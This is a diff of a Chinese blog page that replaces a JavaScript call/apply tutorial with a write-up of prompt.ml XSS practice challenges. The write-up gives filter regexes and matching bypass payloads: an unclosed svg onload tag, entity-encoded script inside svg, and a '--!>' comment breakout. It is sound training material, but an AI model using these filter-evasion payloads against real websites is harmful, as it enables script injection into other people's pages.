@@ -4,26 +4,41 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Js继承-Call/Apply | A1exlism</title>
+    <title>xss习题集_2 | A1exlism</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="A1ex">
     
 
     
-    <meta name="description" content="说明Call() 和 Apply() 都能使目标对象指定一个所需要的this对象
-语法123456//---------call()---------object.call(thisArg[, arg1[, arg2[, ...]]])            //thisArg : 指定的this对象                    //arg1,arg2...为obejcet方法中所传入的">
+    <meta name="description" content="引好久没搞这个了, 再练练几个姿势. 然后打算以后更新xss payload用gist, 养肥了再放blog了
+这几天今天学的是这个练习站: Prompt(1) to win
+Challenges&amp;lt;&amp;gt; 过滤
+/&amp;lt;\/?[^&amp;gt;]+&amp;gt;/gi
+
+1&amp;lt;svg/onload=prompt(1) #注意最后有个空格!!
+想了好久, 还是没法构造出&amp;lt;, 最后看了小抄过的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Js继承-Call/Apply">
-<meta property="og:url" content="http://csser.work/10/25/2015/js-Inherit/index.html">
+<meta property="og:title" content="xss习题集_2">
+<meta property="og:url" content="http://csser.work/08/05/2016/xss-3/index.html">
 <meta property="og:site_name" content="A1exlism">
-<meta property="og:description" content="说明Call() 和 Apply() 都能使目标对象指定一个所需要的this对象
-语法123456//---------call()---------object.call(thisArg[, arg1[, arg2[, ...]]])            //thisArg : 指定的this对象                    //arg1,arg2...为obejcet方法中所传入的">
-<meta property="og:updated_time" content="2016-05-17T15:21:15.828Z">
+<meta property="og:description" content="引好久没搞这个了, 再练练几个姿势. 然后打算以后更新xss payload用gist, 养肥了再放blog了
+这几天今天学的是这个练习站: Prompt(1) to win
+Challenges&amp;lt;&amp;gt; 过滤
+/&amp;lt;\/?[^&amp;gt;]+&amp;gt;/gi
+
+1&amp;lt;svg/onload=prompt(1) #注意最后有个空格!!
+想了好久, 还是没法构造出&amp;lt;, 最后看了小抄过的">
+<meta property="og:updated_time" content="2016-08-05T16:56:12.194Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Js继承-Call/Apply">
-<meta name="twitter:description" content="说明Call() 和 Apply() 都能使目标对象指定一个所需要的this对象
-语法123456//---------call()---------object.call(thisArg[, arg1[, arg2[, ...]]])            //thisArg : 指定的this对象                    //arg1,arg2...为obejcet方法中所传入的">
+<meta name="twitter:title" content="xss习题集_2">
+<meta name="twitter:description" content="引好久没搞这个了, 再练练几个姿势. 然后打算以后更新xss payload用gist, 养肥了再放blog了
+这几天今天学的是这个练习站: Prompt(1) to win
+Challenges&amp;lt;&amp;gt; 过滤
+/&amp;lt;\/?[^&amp;gt;]+&amp;gt;/gi
+
+1&amp;lt;svg/onload=prompt(1) #注意最后有个空格!!
+想了好久, 还是没法构造出&amp;lt;, 最后看了小抄过的">
 <link rel="publisher" href="106896526077043222500">
 
     
@@ -82,14 +97,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/10/25/2015/js-Inherit/" title="Js继承-Call/Apply" itemprop="url">Js继承-Call/Apply</a>
+      <a href="/08/05/2016/xss-3/" title="xss习题集_2" itemprop="url">xss习题集_2</a>
   </h1>
   <p class="article-author">By
        
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2015-10-24T16:00:00.000Z" itemprop="datePublished"> 发表于 10-25-2015</time>
+    <time datetime="2016-08-04T16:00:00.000Z" itemprop="datePublished"> 发表于 08-05-2016</time>
     
   </p>
 </header>
@@ -98,28 +113,42 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说明"><span class="toc-number">1.</span> <span class="toc-text">说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#语法"><span class="toc-number">1.1.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例-call为主"><span class="toc-number">1.2.</span> <span class="toc-text">实例(call为主)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Note1-js"><span class="toc-number">1.2.1.</span> <span class="toc-text">Note1.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Note2-js"><span class="toc-number">1.2.2.</span> <span class="toc-text">Note2.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-VS-apply"><span class="toc-number">1.2.3.</span> <span class="toc-text">call VS apply</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引"><span class="toc-number">1.</span> <span class="toc-text">引</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">2.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-gt-过滤"><span class="toc-number">2.1.</span> <span class="toc-text"><> 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-number">2.2.</span> <span class="toc-text">(= 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gt-替换"><span class="toc-number">2.3.</span> <span class="toc-text">-> 替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#先到这吧-明天继续"><span class="toc-number">2.4.</span> <span class="toc-text">先到这吧, 明天继续!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
 		
 		</div>
 		
-		<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>Call() 和 Apply() 都能使目标对象指定一个所需要的this对象</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------call()---------</span></span><br><span class="line">object.call(thisArg[, arg1[, arg2[, ...]]])</span><br><span class="line">            <span class="comment">//thisArg : 指定的this对象</span></span><br><span class="line">                    <span class="comment">//arg1,arg2...为obejcet方法中所传入的参数值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//---------apply()--------</span></span><br></pre></td></tr></table></figure>
-<h3 id="实例-call为主"><a href="#实例-call为主" class="headerlink" title="实例(call为主)"></a>实例(call为主)</h3><h4 id="Note1-js"><a href="#Note1-js" class="headerlink" title="Note1.js"></a>Note1.js</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Product</span>(<span class="params">name, price</span>)</span>&#123;      <span class="comment">//Product方法</span></span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.price = price;</span><br><span class="line">  <span class="keyword">if</span>(price &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">RangeError</span>(<span class="string">'Cannot create product "'</span> + name +<span class="string">'"'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Food</span>(<span class="params">name, price</span>)</span>&#123;         <span class="comment">//Food类</span></span><br><span class="line">  Product.call(<span class="keyword">this</span>, name, price);  <span class="comment">//看12th行</span></span><br><span class="line">  <span class="keyword">this</span>.category = <span class="string">'food'</span>;</span><br><span class="line">&#125;</span><br><span class="line">Food.prototype = <span class="keyword">new</span> Product();     <span class="comment">//Food现在拥有了Product()的方法了</span></span><br><span class="line"><span class="keyword">var</span> cheese = <span class="keyword">new</span> Food(<span class="string">'feta'</span>, <span class="number">5</span>);   <span class="comment">//cheese现在是Food()的一个实例对象,在Food()函数中所指向的this就是cheese,而里面的call()函数中的name和price就被指定为'fete'和5了</span></span><br><span class="line"><span class="built_in">console</span>.log(cheese.category);<span class="comment">//food</span></span><br><span class="line"><span class="built_in">console</span>.log(cheese.name + <span class="string">' 价值: $'</span> + cheese.price);<span class="comment">//feta价值5</span></span><br></pre></td></tr></table></figure>
-<p>继承图:<br>  Product   -&gt;  Food          -&gt;  ‘cheese’(实例)<br>  name          name               feta<br>  price         price              5<br>                category(new)      food </p>
-<h4 id="Note2-js"><a href="#Note2-js" class="headerlink" title="Note2.js"></a>Note2.js</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> father = &#123;</span><br><span class="line">  age : <span class="number">50</span>,</span><br><span class="line">  birthday : <span class="function"><span class="keyword">function</span>(<span class="params">fPrefix, fPostfix</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fPrefix + <span class="keyword">this</span>.age++ +fPostfix;  <span class="comment">//this-&gt;father对象</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> son =&#123;</span><br><span class="line">  age : <span class="number">22</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(father.birthday(<span class="string">'Dad is '</span>,<span class="string">' now.'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(father.birthday.call(son, <span class="string">'Son is '</span>,<span class="string">' now'</span>)); <span class="comment">//this-&gt;son对象</span></span><br><span class="line"><span class="built_in">console</span>.log(father.birthday.apply(son,[<span class="string">'Son is '</span>,<span class="string">' now.'</span>]));</span><br></pre></td></tr></table></figure>
-<h4 id="call-VS-apply"><a href="#call-VS-apply" class="headerlink" title="call VS apply"></a>call VS apply</h4><ol>
-<li>call接受args  apply接受arg+args<a href="数组"></a></li>
-<li>执行效率:<blockquote><p>It appears that while executing methods with no arguments  or passing just one argument <code>call()</code> method outperforms <code>apply()</code>. Results look much different for hundreds arguments passed into the function, where <code>apply()</code> was executed about 6 times faster – that would mean it should be used when it comes down to higher number of arguments passing to the function along with reference to defined execution scope.</p>
-<footer><strong>rusticode.com</strong></footer></blockquote>
-即在1个或者没有参数的情况下,call()的执行效率具有优势,在参数量比较大的情况下使用apply()<br>可从<a href="http://jsperf.com/test-call-vs-apply/13" target="_blank" rel="external">jsPerf-call vs apply</a>查看实现效果<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/call" target="_blank" rel="external">MDN-call()</a><br><a href="http://rusticode.com/2012/08/15/javascript-call-and-apply/" target="_blank" rel="external">rusticode.com</a><br><a href="https://msdn.microsoft.com/en-us/library/h2ak8h2y(v=vs.94" target="_blank" rel="external">MSDN</a>.aspx)<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply" target="_blank" rel="external">MDN-apply()</a></li>
+		<h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>好久没搞这个了, 再练练几个姿势. 然后打算以后更新xss payload用gist, 养肥了再放blog了</p>
+<p>这几天<del>今天</del>学的是这个练习站: <a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a></p>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="lt-gt-过滤"><a href="#lt-gt-过滤" class="headerlink" title="&lt;&gt; 过滤"></a>&lt;&gt; 过滤</h3><blockquote>
+<p>/&lt;\/?[^&gt;]+&gt;/gi</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(1) <span class="comment">#注意最后有个空格!!</span></span><br></pre></td></tr></table></figure>
+<p>想了好久, 还是没法构造出<code>&lt;</code>, 最后看了小抄过的, 好蛋疼…<br>然而答案有点出乎意料, 想了一下也有道理, html会自动进行闭合, <code>svg</code>真心不错.<br>不过后面的空格还是不懂为什么存在与否会有这么大区别..</p>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="(= 过滤"></a>(= 过滤</h3><blockquote>
+<p>input = input.replace(/[=(]/g, ‘’);</p>
+</blockquote>
+<ol>
+<li>ES6的新特性可以用 ` 来替换 ( <del>不过这题不行</del><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt.call`this, 1`</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
 </ol>
+<p>2.找了半天, 找到了payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>搞了之后才发现svg和script组合简直是无敌了, <code>HTML编码+script</code>(本例用了html10hex)</p>
+<h3 id="gt-替换"><a href="#gt-替换" class="headerlink" title="-&gt; 替换"></a>-&gt; 替换</h3><blockquote>
+<p>input.replace(/-&gt;/g, ‘_’);</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span><br><span class="line">  --!&gt;&lt;svg/onload=prompt(1)       </span><br><span class="line">--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload就是<code>--!&gt;</code>, 还好看了答案, 不然打死都想不到..  这个解析我服!</p>
+<blockquote>
+<p>原文<br>Although the character sequence <code>--!&gt;</code> raises a Parse error, the <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/syntax.html#comments" target="_blank" rel="external">HTML Specifications</a> defines the tokenization that makes it an alternative to end a comment:</p>
+</blockquote>
+<h3 id="先到这吧-明天继续"><a href="#先到这吧-明天继续" class="headerlink" title="先到这吧, 明天继续!"></a>先到这吧, 明天继续!</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://csser.work/10/25/2015/js-Inherit/" data-title="Js继承-Call/Apply | A1exlism" data-tsina="null" class="share clearfix">
+	  <div data-url="http://csser.work/08/05/2016/xss-3/" data-title="xss习题集_2 | A1exlism" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -133,18 +162,18 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/10/27/2015/js-window-document/" title="Js--window VS Document">
+ <a href="/08/05/2016/js-template-strings/" title="ES6 模板字符串&amp;&amp;Xss利用">
   <strong>上一篇：</strong><br/>
   <span>
-  Js--window VS Document</span>
+  ES6 模板字符串&amp;&amp;Xss利用</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/10/21/2015/linux-cmd-mount/"  title="分区挂载/自动加载">
+<a href="/08/01/2016/x-nuca-writeup/"  title="Xnuca_Writeup">
  <strong>下一篇：</strong><br/> 
- <span>分区挂载/自动加载
+ <span>Xnuca_Writeup
 </span>
 </a>
 </div>
@@ -153,7 +182,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="10/25/2015/js-Inherit/" data-title="Js继承-Call/Apply" data-url="http://csser.work/10/25/2015/js-Inherit/"></div>
+	<div class="ds-thread" data-thread-key="08/05/2016/xss-3/" data-title="xss习题集_2" data-url="http://csser.work/08/05/2016/xss-3/"></div>
 </section>
 
 
@@ -163,7 +192,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说明"><span class="toc-number">1.</span> <span class="toc-text">说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#语法"><span class="toc-number">1.1.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例-call为主"><span class="toc-number">1.2.</span> <span class="toc-text">实例(call为主)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Note1-js"><span class="toc-number">1.2.1.</span> <span class="toc-text">Note1.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Note2-js"><span class="toc-number">1.2.2.</span> <span class="toc-text">Note2.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-VS-apply"><span class="toc-number">1.2.3.</span> <span class="toc-text">call VS apply</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引"><span class="toc-number">1.</span> <span class="toc-text">引</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">2.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-gt-过滤"><span class="toc-number">2.1.</span> <span class="toc-text"><> 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-number">2.2.</span> <span class="toc-text">(= 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gt-替换"><span class="toc-number">2.3.</span> <span class="toc-text">-> 替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#先到这吧-明天继续"><span class="toc-number">2.4.</span> <span class="toc-text">先到这吧, 明天继续!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
  
   </div>
 
